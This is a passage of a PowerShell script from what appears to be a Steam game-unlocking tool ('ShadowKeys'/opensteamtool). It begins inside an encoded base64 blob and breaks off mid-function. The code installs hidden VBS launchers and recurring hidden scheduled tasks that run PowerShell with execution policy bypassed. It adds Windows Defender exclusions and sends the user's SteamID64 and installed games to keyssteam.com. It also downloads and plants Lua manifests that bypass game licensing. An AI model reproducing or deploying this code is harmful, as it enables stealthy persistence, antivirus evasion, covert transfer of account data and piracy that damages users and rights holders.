maW5hbGx5IHsKICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkbG9ja1BhdGgpIHsKICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkbG9ja1BhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgfQp9CmV4aXQgMA==')
  $luaScript = [Text.Encoding]::UTF8.GetString($bytes)
  Set-Content -LiteralPath $scriptPath -Value $luaScript -Encoding UTF8
  $launcherPath = Get-LuaRepairLauncherPath $SteamRoot
  Write-HiddenPsLauncherVbs -VbsPath $launcherPath -Ps1Path $scriptPath
  return @{ ScriptPath = $scriptPath; LauncherPath = $launcherPath }
}


function Write-LuaSpawnLog {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$Message
  )
  try {
    $logDir = Join-Path $SteamRoot 'opensteamtool\logs'
    if (-not (Test-Path -LiteralPath $logDir)) {
      New-Item -Path $logDir -ItemType Directory -Force | Out-Null
    }
    $logPath = Join-Path $logDir 'lua-spawn.log'
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -LiteralPath $logPath -Value "[$ts] $Message" -Encoding UTF8
  } catch {}
}

function Remove-LuaRepairArtifacts {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  Write-LuaSpawnLog -SteamRoot $SteamRoot -Message 'remove inicio'
  try {
    foreach ($name in @($script:SkLuaRepairTaskName) + $script:SkLuaRepairLegacyTaskNames) {
      try {
        Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
      } catch {}
      try {
        $sch = Join-Path $env:SystemRoot 'System32\schtasks.exe'
        & $sch /Delete /TN $name /F 2>$null | Out-Null
      } catch {}
    }
    $scriptPath = Get-LuaRepairScriptPath $SteamRoot
    if (Test-Path -LiteralPath $scriptPath) {
      try { Remove-Item -LiteralPath $scriptPath -Force -ErrorAction SilentlyContinue } catch {}
    }
    $launcherPath = Get-LuaRepairLauncherPath $SteamRoot
    if (Test-Path -LiteralPath $launcherPath) {
      try { Remove-Item -LiteralPath $launcherPath -Force -ErrorAction SilentlyContinue } catch {}
    }
    $lockPath = Join-Path $SteamRoot 'opensteamtool\logs\lua-repair-background.lock'
    if (Test-Path -LiteralPath $lockPath) {
      try {
        $lockPid = [int](Get-Content -LiteralPath $lockPath -ErrorAction SilentlyContinue | Select-Object -First 1)
        if ($lockPid -gt 0) {
          Get-Process -Id $lockPid -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
      } catch {}
      try { Remove-Item -LiteralPath $lockPath -Force -ErrorAction SilentlyContinue } catch {}
    }
    Write-LuaSpawnLog -SteamRoot $SteamRoot -Message 'remove ok'
  } catch {
    Write-LuaSpawnLog -SteamRoot $SteamRoot -Message ('remove erro: ' + $_.Exception.Message)
  }
}

function Start-LuaRepairOnce {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  Write-LuaSpawnLog -SteamRoot $SteamRoot -Message 'once inicio'
  try {
    Remove-LuaRepairArtifacts -SteamRoot $SteamRoot
    $paths = Ensure-LuaRepairScript -SteamRoot $SteamRoot
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe')
    $psi.Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $paths.ScriptPath + '"'
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    [void][System.Diagnostics.Process]::Start($psi)
    Write-LuaSpawnLog -SteamRoot $SteamRoot -Message ('once spawn ok script=' + $paths.ScriptPath)
  } catch {
    Write-LuaSpawnLog -SteamRoot $SteamRoot -Message ('once erro: ' + $_.Exception.Message)
  }
}

function Start-LuaRepairBackground {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  Write-LuaSpawnLog -SteamRoot $SteamRoot -Message 'setup inicio'
  try {
    foreach ($legacyName in $script:SkLuaRepairLegacyTaskNames) {
      try {
        Unregister-ScheduledTask -TaskName $legacyName -Confirm:$false -ErrorAction Stop
      } catch {}
    }
    $paths = Ensure-LuaRepairScript -SteamRoot $SteamRoot
    $taskOk = Register-HiddenPsScheduledTask -TaskName $script:SkLuaRepairTaskName -VbsPath $paths.LauncherPath -IntervalMinutes $script:SkLuaRepairIntervalMinutes
    Write-LuaSpawnLog -SteamRoot $SteamRoot -Message ('setup script=' + $paths.ScriptPath + ' launcher=' + $paths.LauncherPath + ' task=' + $taskOk)
  } catch {
    Write-LuaSpawnLog -SteamRoot $SteamRoot -Message ('setup erro: ' + $_.Exception.Message)
  }
}


  
function Remove-BypassRepairArtifacts {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  $ostDir = Join-Path $SteamRoot 'opensteamtool'
  $logDir = Join-Path $ostDir 'logs'
  foreach ($rel in @(
    'bypass-repair.ps1',
    'bypass-repair-launch.vbs'
  )) {
    $path = Join-Path $ostDir $rel
    if (Test-Path -LiteralPath $path) {
      try { Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue } catch {}
    }
  }
  $localLauncher = Join-Path $env:LOCALAPPDATA 'ShadowKeys\bypass-repair-launch.vbs'
  if (Test-Path -LiteralPath $localLauncher) {
    try { Remove-Item -LiteralPath $localLauncher -Force -ErrorAction SilentlyContinue } catch {}
  }
  $lockPath = Join-Path $logDir 'bypass-background.lock'
  if (Test-Path -LiteralPath $lockPath) {
    try {
      $lockPid = [int](Get-Content -LiteralPath $lockPath -ErrorAction SilentlyContinue | Select-Object -First 1)
      if ($lockPid -gt 0) {
        Get-Process -Id $lockPid -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      }
    } catch {}
    try { Remove-Item -LiteralPath $lockPath -Force -ErrorAction SilentlyContinue } catch {}
  }
  try {
    Unregister-ScheduledTask -TaskName "SK-BypassRepair" -Confirm:$false -ErrorAction SilentlyContinue
  } catch {}
  try {
    $sch = Join-Path $env:SystemRoot 'System32\schtasks.exe'
    & $sch /Delete /TN "SK-BypassRepair" /F 2>$null | Out-Null
  } catch {}
}


  
function Write-InstalledLog {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$Message
  )
  try {
    $logDir = Join-Path $SteamRoot 'opensteamtool\\logs'
    if (-not (Test-Path -LiteralPath $logDir)) {
      New-Item -Path $logDir -ItemType Directory -Force | Out-Null
    }
    $logPath = Join-Path $logDir 'installed-repair.log'
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -LiteralPath $logPath -Value "[$ts] $Message" -Encoding UTF8
  } catch {}
}

function Test-LuaPresent {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId
  )
  foreach ($dir in (Get-LuaManifestDirs $SteamRoot)) {
    $path = Join-Path $dir ("{0}.lua" -f $AppId)
    if (Test-Path -LiteralPath $path) { return $true }
  }
  return $false
}

function Ensure-LuaDirs {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  foreach ($dir in (Get-LuaManifestDirs $SteamRoot)) {
    Ensure-LuaManifestDir $dir | Out-Null
  }
}


function Test-SteamDriveReady {
  param([string]$Path)
  if (-not $Path) { return $false }
  try {
    $root = [System.IO.Path]::GetPathRoot($Path)
    if (-not $root) { return $false }
    if ($root.StartsWith('\\')) {
      try { return [System.IO.Directory]::Exists($root) } catch { return $false }
    }
    foreach ($d in [System.IO.DriveInfo]::GetDrives()) {
      if ($d.Name -eq $root) { return $d.IsReady }
    }
    return $false
  } catch { return $false }
}

function Test-SteamFsPath {
  param([string]$Path)
  if (-not $Path) { return $false }
  if (-not (Test-SteamDriveReady $Path)) { return $false }
  try {
    if ([System.IO.Directory]::Exists($Path)) { return $true }
    if ([System.IO.File]::Exists($Path)) { return $true }
  } catch {}
  return $false
}

function Get-LibraryPaths([string]$SteamRoot) {
  $paths = New-Object System.Collections.Generic.List[string]
  [void]$paths.Add($SteamRoot)
  $vdf = Join-Path $SteamRoot "steamapps\libraryfolders.vdf"
  if (-not (Test-SteamFsPath $vdf)) { return $paths }
  try {
    $raw = [System.IO.File]::ReadAllText($vdf)
    foreach ($m in [regex]::Matches($raw, '"path"\s*"([^"]+)"')) {
      $p = ($m.Groups[1].Value -replace '\\\\', '\\').Trim()
      if ($p -and (Test-SteamFsPath $p)) { [void]$paths.Add($p) }
    }
  } catch {}
  return $paths
}

function Get-SteamId64([string]$SteamRoot) {
  $vdf = Join-Path $SteamRoot "config\loginusers.vdf"
  if (-not (Test-Path -LiteralPath $vdf)) { return $null }
  try {
    $raw = [System.IO.File]::ReadAllText($vdf)
    $blocks = [regex]::Matches($raw, '"(\d{17})"\s*\{([^}]*)\}')
    $bestId = $null
    $bestRecent = $false
    foreach ($block in $blocks) {
      $id = $block.Groups[1].Value
      $body = $block.Groups[2].Value
      $recent = $body -match '"MostRecent"\s*"1"'
      if (-not $bestId -or ($recent -and -not $bestRecent)) {
        $bestId = $id
        $bestRecent = [bool]$recent
      }
    }
    return $bestId
  } catch {
    return $null
  }
}

function Get-GameDir([string]$SteamRoot, [string]$AppId) {
  foreach ($lib in (Get-LibraryPaths $SteamRoot)) {
    $acf = Join-Path $lib ("steamapps\appmanifest_{0}.acf" -f $AppId)
    if (-not (Test-SteamFsPath $acf)) { continue }
    try {
      $raw = [System.IO.File]::ReadAllText($acf)
      $m = [regex]::Match($raw, '"installdir"\s*"([^"]+)"')
      if ($m.Success) {
        $dir = Join-Path $lib ("steamapps\common\{0}" -f $m.Groups[1].Value)
        if (Test-SteamFsPath $dir) { return $dir }
      }
    } catch {}
  }
  return $null
}

function Get-GameDisplayName([string]$SteamRoot, [string]$AppId) {
  foreach ($lib in (Get-LibraryPaths $SteamRoot)) {
    $acf = Join-Path $lib ("steamapps\appmanifest_{0}.acf" -f $AppId)
    if (-not (Test-SteamFsPath $acf)) { continue }
    try {
      $raw = [System.IO.File]::ReadAllText($acf)
      $m = [regex]::Match($raw, '"name"\s*"([^"]+)"')
      if ($m.Success -and $m.Groups[1].Value.Trim()) {
        return $m.Groups[1].Value.Trim()
      }
    } catch {}
  }
  $dir = Get-GameDir $SteamRoot $AppId
  if ($dir) { return (Split-Path $dir -Leaf) }
  return ("App " + $AppId)
}

function Get-ShadowKeysAppIds([string]$SteamRoot, [string]$SteamId64) {
  $ids = New-Object 'System.Collections.Generic.HashSet[string]'
  if ($SteamId64) {
    $statePath = Join-Path $SteamRoot ("opensteamtool\client\{0}.sk" -f $SteamId64)
    if (Test-Path -LiteralPath $statePath) {
      try {
        foreach ($m in [regex]::Matches([System.IO.File]::ReadAllText($statePath), '"(\d{3,10})"\s*:')) {
          [void]$ids.Add($m.Groups[1].Value)
        }
      } catch {}
    }
  }
  foreach ($luaDir in @(
    (Join-Path $SteamRoot "config\lua"),
    (Join-Path $SteamRoot "config\stplug-in")
  )) {
    if (-not (Test-Path -LiteralPath $luaDir)) { continue }
    Get-ChildItem -LiteralPath $luaDir -Filter "*.lua" -File -ErrorAction SilentlyContinue | ForEach-Object {
      if ($_.BaseName -match '^[0-9]+$') { [void]$ids.Add($_.BaseName) }
    }
  }
  return @($ids | Sort-Object { [int]$_ })
}

function Test-AppInstalled([string]$SteamRoot, [string]$AppId) {
  foreach ($lib in (Get-LibraryPaths $SteamRoot)) {
    $acf = Join-Path $lib ("steamapps\appmanifest_{0}.acf" -f $AppId)
    if (-not (Test-SteamFsPath $acf)) { continue }
    try {
      $raw = [System.IO.File]::ReadAllText($acf)
      if ($raw -match '"StateFlags"\s*"(\d+)"') {
        $flags = [int]$Matches[1]
        if (($flags -band 4) -ne 0) { return $true }
      }
      if ($raw -match '"installdir"\s*"([^"]+)"') {
        $dir = Join-Path $lib ("steamapps\common\" + $Matches[1])
        if (Test-SteamFsPath $dir) { return $true }
      }
    } catch {}
  }
  return $false
}

function Set-LaunchRecencyScore {
  param(
    $Scores,
    [string]$AppId,
    [int64]$Unix
  )
  if (-not $AppId -or $Unix -le 0) { return }
  if (-not $Scores.ContainsKey($AppId) -or $Unix -gt $Scores[$AppId]) {
    $Scores[$AppId] = $Unix
  }
}

function Convert-LaunchTraceTimestamp([string]$Text) {
  try {
    $dt = [DateTime]::ParseExact($Text, "yyyy-MM-dd HH:mm:ss", $null)
    return [DateTimeOffset]::new($dt).ToUnixTimeSeconds()
  } catch {
    return 0L
  }
}

function Read-TextFileShared([string]$Path) {
  if (-not (Test-Path -LiteralPath $Path)) { return $null }
  try {
    $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    try {
      $sr = New-Object System.IO.StreamReader($fs, [System.Text.Encoding]::UTF8, $true)
      try { return $sr.ReadToEnd() } finally { $sr.Dispose() }
    } finally { $fs.Dispose() }
  } catch {
    try { return [System.IO.File]::ReadAllText($Path) } catch { return $null }
  }
}

function Get-LaunchRecencyScores {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)
  $scores = @{}
  $launchTrace = Join-Path $SteamRoot "opensteamtool\launch-trace.log"
  $raw = Read-TextFileShared $launchTrace
  if ($raw) {
    foreach ($m in [regex]::Matches($raw, '\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s*SpawnProcess appid=(\d+)')) {
      Set-LaunchRecencyScore -Scores $scores -AppId $m.Groups[2].Value -Unix (Convert-LaunchTraceTimestamp $m.Groups[1].Value)
    }
  }
  $logsDir = Join-Path $SteamRoot "logs"
  foreach ($name in @('content_log.txt', 'content_log.previous.txt')) {
    $raw = Read-TextFileShared (Join-Path $logsDir $name)
    if (-not $raw) { continue }
    foreach ($m in [regex]::Matches($raw, '\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s*Failed running app (\d+) \(missing executable')) {
      Set-LaunchRecencyScore -Scores $scores -AppId $m.Groups[2].Value -Unix (Convert-LaunchTraceTimestamp $m.Groups[1].Value)
    }
  }
  foreach ($name in @('console_log.txt', 'console_log.previous.txt')) {
    $raw = Read-TextFileShared (Join-Path $logsDir $name)
    if (-not $raw) { continue }
    foreach ($m in [regex]::Matches($raw, '\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s*GameAction \[AppID (\d+)[^\]]*\]\s*:\s*LaunchApp')) {
      Set-LaunchRecencyScore -Scores $scores -AppId $m.Groups[2].Value -Unix (Convert-LaunchTraceTimestamp $m.Groups[1].Value)
    }
  }
  foreach ($lib in (Get-LibraryPaths $SteamRoot)) {
    $appsDir = Join-Path $lib "steamapps"
    if (-not (Test-SteamFsPath $appsDir)) { continue }
    Get-ChildItem -LiteralPath $appsDir -Filter "appmanifest_*.acf" -File -ErrorAction SilentlyContinue | ForEach-Object {
      if ($_.BaseName -notmatch '^appmanifest_(\d+)$') { return }
      $appId = $Matches[1]
      $acfRaw = Read-TextFileShared $_.FullName
      if (-not $acfRaw) { return }
      $lp = [regex]::Match($acfRaw, '"LastPlayed"\s*"(\d+)"')
      if ($lp.Success) {
        Set-LaunchRecencyScore -Scores $scores -AppId $appId -Unix ([int64]$lp.Groups[1].Value)
      }
    }
  }
  return $scores
}

function Get-BypassRepairScore {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId,
    $LaunchScores = $null
  )
  if (-not $LaunchScores) { $LaunchScores = Get-LaunchRecencyScores $SteamRoot }
  if ($LaunchScores.ContainsKey($AppId)) {
    return [int64]$LaunchScores[$AppId]
  }
  $touch = Join-Path $SteamRoot ("opensteamtool\bypass-recent\{0}.touch" -f $AppId)
  if (Test-Path -LiteralPath $touch) {
    try {
      $raw = ([System.IO.File]::ReadAllText($touch)).Trim()
      if ($raw -match '^[0-9]+$') { return [int64]$raw }
    } catch {}
  }
  return 0L
}

function Sort-InstalledBypassApps {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string[]]$AppIds
  )
  $launchScores = Get-LaunchRecencyScores $SteamRoot
  return @($AppIds | Sort-Object -Descending {
    Get-BypassRepairScore -SteamRoot $SteamRoot -AppId $_ -LaunchScores $launchScores
  }, {
    [int]$_
  })
}

function Get-RecentPlayedAppIds {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [int]$Limit = 3,
    [string]$SteamId64 = $null
  )
  if ($Limit -lt 1) { return @() }
  if (-not $SteamId64) { $SteamId64 = Get-SteamId64 $SteamRoot }
  if (-not $SteamId64) { return @() }
  $allIds = Get-ShadowKeysAppIds $SteamRoot $SteamId64
  $installed = @($allIds | Where-Object { Test-AppInstalled $SteamRoot $_ })
  if ($installed.Count -eq 0) { return @() }
  $launchScores = Get-LaunchRecencyScores $SteamRoot
  $sorted = Sort-InstalledBypassApps -SteamRoot $SteamRoot -AppIds $installed
  $recent = New-Object System.Collections.Generic.List[string]
  foreach ($appId in $sorted) {
    $score = Get-BypassRepairScore -SteamRoot $SteamRoot -AppId $appId -LaunchScores $launchScores
    if ($score -le 0) { continue }
    [void]$recent.Add([string]$appId)
    if ($recent.Count -ge $Limit) { break }
  }
  return @($recent)
}

function Write-ForceBypassFlag([string]$SteamRoot, [string]$AppId) {
  $ostDir = Join-Path $SteamRoot "opensteamtool"
  if (-not (Test-Path -LiteralPath $ostDir)) {
    New-Item -Path $ostDir -ItemType Directory -Force | Out-Null
  }
  $flag = Join-Path $ostDir ("force-bypass-{0}.flag" -f $AppId)
  $ts = [string][DateTimeOffset]::Now.ToUnixTimeSeconds()
  try {
    Set-Content -LiteralPath $flag -Value $ts -Encoding ASCII -Force
    return $true
  } catch {
    return $false
  }
}

function Get-SteamPathFromRegistry {
  foreach ($key in @(
    'HKLM:\SOFTWARE\WOW6432Node\Valve\Steam',
    'HKLM:\SOFTWARE\Valve\Steam',
    'HKCU:\Software\Valve\Steam'
  )) {
    try {
      $prop = Get-ItemProperty $key -ErrorAction Stop
      if ($prop.InstallPath -and (Test-Path $prop.InstallPath)) { return $prop.InstallPath }
      if ($prop.SteamPath -and (Test-Path $prop.SteamPath)) { return $prop.SteamPath }
    } catch {}
  }
  return $null
}

function Get-LuaManifestDirs([string]$SteamRoot) {
  return @(
    (Join-Path $SteamRoot "config\lua"),
    (Join-Path $SteamRoot "config\stplug-in")
  )
}

function Ensure-LuaManifestDir([string]$Dir) {
  if (-not (Test-Path -LiteralPath $Dir)) {
    New-Item -Path $Dir -ItemType Directory -Force | Out-Null
  }
  return $Dir
}

function Expand-HubcapZipArchive {
  param(
    [Parameter(Mandatory = $true)][string]$ArchivePath,
    [Parameter(Mandatory = $true)][string]$DestinationPath
  )
  try {
    Expand-Archive -LiteralPath $ArchivePath -DestinationPath $DestinationPath -Force -ErrorAction Stop
    return $true
  } catch {}
  try {
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
    [System.IO.Compression.ZipFile]::ExtractToDirectory($ArchivePath, $DestinationPath)
    return $true
  } catch {}
  return $false
}

function Get-HubcapZipManifestDepotIds {
  param([Parameter(Mandatory = $true)][string]$ArchivePath)
  $depotIds = New-Object System.Collections.Generic.HashSet[string]
  $stage = Join-Path $env:TEMP ("sk-hubcap-scan-" + [guid]::NewGuid().ToString('N'))
  try {
    New-Item -Path $stage -ItemType Directory -Force | Out-Null
    if (-not (Expand-HubcapZipArchive -ArchivePath $ArchivePath -DestinationPath $stage)) { return @() }
    foreach ($manifestFile in @(Get-ChildItem -LiteralPath $stage -Recurse -Filter '*.manifest' -File -ErrorAction SilentlyContinue)) {
      if ($manifestFile.Name -match '^(\d+)_') {
        [void]$depotIds.Add($Matches[1])
      }
    }
  } catch {
  } finally {
    if (Test-Path -LiteralPath $stage) {
      Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
    }
  }
  return @($depotIds)
}

function Clear-SteamAppHubcapState {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId,
    [string[]]$DepotIds = @()
  )
  $result = @{
    AcfRemoved = 0
    DepotCacheRemoved = 0
  }
  foreach ($library in @(Get-LibraryPaths $SteamRoot)) {
    $acfPath = Join-Path $library ("steamapps\appmanifest_{0}.acf" -f $AppId)
    if (Test-Path -LiteralPath $acfPath) {
      Remove-Item -LiteralPath $acfPath -Force -ErrorAction SilentlyContinue
      $result.AcfRemoved++
    }
  }
  $depotDir = Join-Path $SteamRoot "depotcache"
  foreach ($depotId in @($DepotIds)) {
    if (-not $depotId) { continue }
    $pattern = Join-Path $depotDir ("{0}_*.manifest" -f $depotId)
    foreach ($manifestPath in @(Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue)) {
      Remove-Item -LiteralPath $manifestPath.FullName -Force -ErrorAction SilentlyContinue
      $result.DepotCacheRemoved++
    }
  }
  return $result
}

function Install-ManifestLuaFromZip {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId,
    [Parameter(Mandatory = $true)][string]$ArchivePath
  )
  $result = Install-HubcapZipFromArchive -SteamRoot $SteamRoot -AppId $AppId -ArchivePath $ArchivePath
  return [bool]$result.LuaInstalled
}

function Enable-LuaManifestPins([string]$Content) {
  if (-not $Content) { return $Content }
  return [regex]::Replace($Content, '(?m)^(\s*)--\s*(setManifestid\s*\(.*)$', '$1$2')
}

function Install-HubcapZipFromArchive {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId,
    [Parameter(Mandatory = $true)][string]$ArchivePath
  )
  $luaDir = Ensure-LuaManifestDir (Join-Path $SteamRoot "config\lua")
  $stplugDir = Ensure-LuaManifestDir (Join-Path $SteamRoot "config\stplug-in")
  $depotDir = Join-Path $SteamRoot "depotcache"
  if (-not (Test-Path -LiteralPath $depotDir)) {
    New-Item -Path $depotDir -ItemType Directory -Force | Out-Null
  }
  $stage = Join-Path $env:TEMP ("sk-hubcap-extract-" + [guid]::NewGuid().ToString('N'))
  $luaInstalled = $false
  $manifestCount = 0
  try {
    New-Item -Path $stage -ItemType Directory -Force | Out-Null
    if (-not (Expand-HubcapZipArchive -ArchivePath $ArchivePath -DestinationPath $stage)) {
      throw "Nao foi possivel extrair o pacote."
    }
    $luaFile = Get-ChildItem -LiteralPath $stage -Recurse -Filter ("{0}.lua" -f $AppId) -File -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $luaFile) {
      $luaFile = Get-ChildItem -LiteralPath $stage -Recurse -Filter '*.lua' -File -ErrorAction SilentlyContinue | Select-Object -First 1
    }
    if ($luaFile) {
      $luaText = Enable-LuaManifestPins ([System.IO.File]::ReadAllText($luaFile.FullName))
      $luaDest = Join-Path $luaDir ("{0}.lua" -f $AppId)
      $stplugDest = Join-Path $stplugDir ("{0}.lua" -f $AppId)
      [System.IO.File]::WriteAllText($luaDest, $luaText, [System.Text.UTF8Encoding]::new($false))
      [System.IO.File]::WriteAllText($stplugDest, $luaText, [System.Text.UTF8Encoding]::new($false))
      try {
        (Get-Item -LiteralPath $luaDest).LastWriteTime = Get-Date
      } catch {}
      $luaInstalled = $true
    }
    $manifestFiles = @(Get-ChildItem -LiteralPath $stage -Recurse -Filter '*.manifest' -File -ErrorAction SilentlyContinue)
    foreach ($manifestFile in $manifestFiles) {
      $dest = Join-Path $depotDir $manifestFile.Name
      Copy-Item -LiteralPath $manifestFile.FullName -Destination $dest -Force
      $manifestCount++
    }
  } catch {
    return @{
      LuaInstalled = $false
      ManifestCount = 0
      Error = $_.Exception.Message
    }
  } finally {
    if (Test-Path -LiteralPath $stage) {
      Remove-Item -LiteralPath $stage -Recurse -Force -ErrorAction SilentlyContinue
    }
  }
  return @{
    LuaInstalled = $luaInstalled
    ManifestCount = $manifestCount
    Error = $null
  }
}

function Add-DefenderExclusionPath {
  param([string]$Path)
  if (-not $Path -or -not (Test-SteamFsPath $Path)) { return $false }
  try {
    $null = Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
    return $true
  } catch {
    return $false
  }
}



function Get-SkApiHeaders {
  return @{
    Accept = 'application/json'
    'User-Agent' = 'sk-ost/1.0'
    'X-SK-Version' = 'sk-ost'
  }
}

function Invoke-SkApiJson {
  param(
    [Parameter(Mandatory = $true)][string]$Url,
    [Parameter(Mandatory = $true)][string]$Method,
    [string]$Body = $null
  )
  $headers = Get-SkApiHeaders
  $params = @{
    Uri = $Url
    Method = $Method
    Headers = $headers
    TimeoutSec = 60
  }
  if ($Body) {
    $params.Body = $Body
    $params.ContentType = 'application/json; charset=utf-8'
  }
  return Invoke-RestMethod @params
}

function Get-ManifestStateDir([string]$SteamRoot) {
  $dir = Join-Path $SteamRoot 'opensteamtool\\manifest-state'
  if (-not (Test-Path -LiteralPath $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
  }
  return $dir
}

function Get-LocalManifestVersion {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId
  )
  $path = Join-Path (Get-ManifestStateDir $SteamRoot) ("{0}.sk" -f $AppId)
  if (-not (Test-Path -LiteralPath $path)) { return $null }
  try {
    $raw = ([System.IO.File]::ReadAllText($path)).Trim()
    if ($raw -match '^[0-9]+$') { return [int64]$raw }
  } catch {}
  return $null
}

function Set-LocalManifestVersion {
  param(
    [Parameter(Mandatory = $true)][string]$SteamRoot,
    [Parameter(Mandatory = $true)][string]$AppId,
    [Parameter(Mandatory = $true)][int64]$Version
  )
  $path = Join-Path (Get-ManifestStateDir $SteamRoot) ("{0}.sk" -f $AppId)
  try {
    [System.IO.File]::WriteAllText($path, [string]$Version, [System.Text.UTF8Encoding]::new($false))
    return $true
  } catch {
    return $false
  }
}

function Download-ManifestArchive {
  param(
    [Parameter(Mandatory = $true)][string]$Url,
    [Parameter(Mandatory = $true)][string]$OutFile,
    [hashtable]$Headers = @{}
  )
  try {
    if (Test-Path -LiteralPath $OutFile) {
      Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
    }
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.Method = 'GET'
    $req.Timeout = 120000
    foreach ($key in $Headers.Keys) {
      if ($key -eq 'User-Agent') { $req.UserAgent = [string]$Headers[$key] }
      elseif ($key -eq 'Accept') { $req.Accept = [string]$Headers[$key] }
      else { $req.Headers[$key] = [string]$Headers[$key] }
    }
    $resp = $req.GetResponse()
    $stream = $resp.GetResponseStream()
    $file = [System.IO.File]::Open($OutFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
    try {
      $buffer = New-Object byte[] 262144
      while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $file.Write($buffer, 0, $read)
      }
    } finally {
      $file.Close()
      $stream.Close()
      $resp.Close()
    }
    return (Test-Path -LiteralPath $OutFile)
  } catch {
    return $false
  }
}


function Repair-InstalledMissingLuas {
  param([Parameter(Mandatory = $true)][string]$SteamRoot)

  $apiBase = "https://keyssteam.com"
  $steamId = Get-SteamId64 $SteamRoot
  if (-not $steamId) {
    Write-InstalledLog -SteamRoot $SteamRoot -Message 'sem steamid64'
    return 0
  }

  Ensure-LuaDirs -SteamRoot $SteamRoot

  $allIds = @(Get-ShadowKeysAppIds $SteamRoot $steamId)
  $installed = @($allIds | Where-Object { Test-AppInstalled $SteamRoot $_ })
  if ($installed.Count -le 0) {
    Write-InstalledLog -SteamRoot $SteamRoot -Message 'nenhum jogo instalado ativado'
    return 0
  }

  $missing = @($installed | Where-Object { -not (Test-LuaPresent -SteamRoot $SteamRoot -AppId $_) })
  Write-InstalledLog -SteamRoot $SteamRoot -Message ('instalados=' + $installed.Count + ' sem_lua=' + $missing.Count)
  if ($missing.Count -le 0) { return 0 }

  $appsPayload = @()
  foreach ($appId in $installed) {
    $localVersion = Get-LocalManifestVersion -SteamRoot $SteamRoot -AppId $appId
    $appsPayload += @{ appId = $appId; manifestVersion = $localVersion }
  }

  $body = @{
    steamId = $steamId
    installedAppIds = @($installed)
    apps = $appsPayload
  } | ConvertTo-Json -Depth 6 -Compress

  $reactivateUrl = $apiBase.TrimEnd('/') + '/api/steam-keys/reactivate'
  $response = $null
  try {
    $response = Invoke-SkApiJson -Url $reactivateUrl -Method POST -Body $body
  } catch {
    Write-InstalledLog -SteamRoot $SteamRoot -Message ('reactivate erro: ' + $_.Exception.Message)
    return 0
  }

  $games = @($response.games)
  if ($games.Count -le 0) {
    Write-InstalledLog -SteamRoot $SteamRoot -Message 'reactivate sem jogos'
    return 0
  }

  $missingSet = @{}
  foreach ($appId in $missing) { $missingSet[[string]$appId] = $true }

  $fixed = 0
  foreach ($game in $games) {
    $appId = [string]$game.appId
    if (-not $appId) { continue }
    if (-not $missingSet.ContainsKey($appId)) { continue }

    $manifestUrl = [string]$game.manifestUrl
    if (-not $manifestUrl) {
      Write-InstalledLog -SteamRoot $SteamRoot -Message ("[$appId] sem manifestUrl")
      continue
    }

    $sync = $null
    $syncUrl = $apiBase.TrimEnd('/') + '/api/steam-keys/manifest-sync'
    $syncBody = @{
      steamId = $steamId
      appId = $appId
      manifestVersion = (Get-LocalManifestVersion -SteamRoot $SteamRoot -AppId $appId)
    } | ConvertTo-Json -Compress
    try {
      $sync = Invoke-SkApiJson -Url $syncUrl -Method POST -Body $syncBody
      if ($sync.game -and $sync.game.manifestUrl) {
        $manifestUrl = [string]$sync.game.manifestUrl
      }
    } catch {
      Write-InstalledLog -SteamRoot $SteamRoot -Message ("[$appId] manifest-sync: " + $_.Exception.Message)
    }

    $headers = Get-SkApiHeaders
    if ($game.manifestHeaders) {
